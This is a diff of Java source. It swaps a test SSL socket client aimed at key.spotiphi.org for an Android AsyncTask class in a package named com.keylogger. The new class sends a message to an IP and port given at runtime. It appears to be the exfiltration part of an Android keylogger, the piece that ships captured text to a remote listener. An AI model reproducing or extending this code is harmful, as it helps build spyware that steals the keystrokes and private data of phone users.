@@ -1,36 +1,35 @@
-import javax.net.ssl.SSLSocket;
-import javax.net.ssl.SSLSocketFactory;
-import java.io.PrintWriter;
-import java.net.URL;
+package com.keylogger;
+import android.os.*;
+import java.net.Socket;
+import java.io.*;
 
-public class Main {
-	public static void main(String[] args) {
-		String ip = "http://key.spotiphi.org"; // The URL
-		int port = 80; // The port number
-		String message = "Hello, secure world!"; // The message to send
+public class MessageSender extends AsyncTask<String,Void,Void>
+{
+	Socket s;
+	DataOutputStream dos;
+	PrintWriter pw;
 
-		try {
-			// Parse the hostname from the URL
-			URL url = new URL(ip);
-			String hostname = url.getHost(); // Extract "key.spotiphi.org"
-
-			// Create an SSLSocketFactory
-			SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();
-
-			// Create an SSLSocket connection
-			SSLSocket sslSocket = (SSLSocket) factory.createSocket(hostname, port);
-			System.out.println("Connected securely to " + hostname + " on port " + port);
-
-			// Write the message to the socket
-			PrintWriter pw = new PrintWriter(sslSocket.getOutputStream(), true);
+	@Override
+	protected Void doInBackground(String... voids)
+	{	
+		String message = voids[0];
+		String ip=voids[1];
+		int port= Integer.parseInt(voids[2]);
+		try
+		{
+			s = new Socket(ip, port);
+			pw =  new PrintWriter(s.getOutputStream());
 			pw.write(message.concat("\n"));
 			pw.flush();
-
-			// Close the socket
-			sslSocket.close();
-			System.out.println("Message sent and connection closed.");
-		} catch (Exception e) {
+			s.close();
+		}
+		catch (IOException e)
+		{
 			e.printStackTrace();
 		}
+		return null;
 	}
+	
+	
 }
+
